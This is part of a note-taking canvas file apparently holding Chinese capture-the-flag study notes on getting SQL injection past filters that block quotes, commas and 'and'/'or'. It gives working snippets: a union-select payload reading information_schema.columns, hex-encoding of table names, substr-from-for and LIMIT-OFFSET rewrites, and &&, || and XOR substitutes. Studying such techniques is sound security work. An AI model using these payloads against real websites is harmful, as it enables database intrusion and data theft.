		{"id":"7eb6c5177d6598c8","type":"text","text":"空格被ban了？","x":-8043,"y":2366,"width":250,"height":60},
		{"id":"b5cbff30aaff8e9a","type":"text","text":"# SQL 单引号 `'` 绕过\n## 使用十六进制代替\n例如\n```sql\nunion select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag' #\n```\n这样读取没东西\n可以考虑把 `flag` 换成 `0x666c6167`","x":-7911,"y":2695,"width":560,"height":335},
		{"id":"a66768b0462b4bd3","type":"text","text":"单引号 `'` 被ban了？","x":-7685,"y":2366,"width":250,"height":60},
		{"id":"409920349830ca5e","type":"text","text":"是否有WAF？","x":-7424,"y":1804,"width":250,"height":50},
		{"id":"6fcadfcbee1b31ba","type":"text","text":"## SQL`,` 绕过\n`,` 被 ban 了，这意味着大多数函数，例如 `substr` `mid` 没法按照正常的方式使用\n\n## 使用 `from...for` 来截取字符串\n常规：`substr(database(),1,1)`\n\t`substr(string, start, length)`\n非常规（和非常规是等效的）：\n- `substr(database() from 1 for 1)`\n- `mid(database() from 1 for 1)`\n\n## 使用 `offset`\n`limit` 语句通常会用 `,` ，不过可以用 `offset` 代替\n`limit 0,1` 可以改写成 `LIMIT 1 OFFSET 0`\n","x":-7271,"y":2695,"width":440,"height":520},
		{"id":"ee91d3ff741ee22a","type":"text","text":"逗号 `,` 被ban了？","x":-7234,"y":2371,"width":250,"height":60},
		{"id":"112b922442e1dd84","type":"text","text":"`and` 或 `or` 被ban了？","x":-6876,"y":2380,"width":250,"height":60},
		{"id":"ccdab5fa6a9ddf5f","type":"text","text":"# SQL `and` `or` 绕过\n\n## 使用 `&&` 和 `||` 进行替代\n- 使用 `&&` 代替 `AND`（URL 编码为 `%26%26`）。\n    \n- 使用 `||` 代替 `OR`（URL 编码为 `%7c%7c`）。\n## 使用异或 `^` `XOR`\n此方法可以代替 `and`\n- `1^1^1` 为真（页面正常）\n- `1^0^1` 为假（页面异常）","x":-6751,"y":2695,"width":445,"height":402},
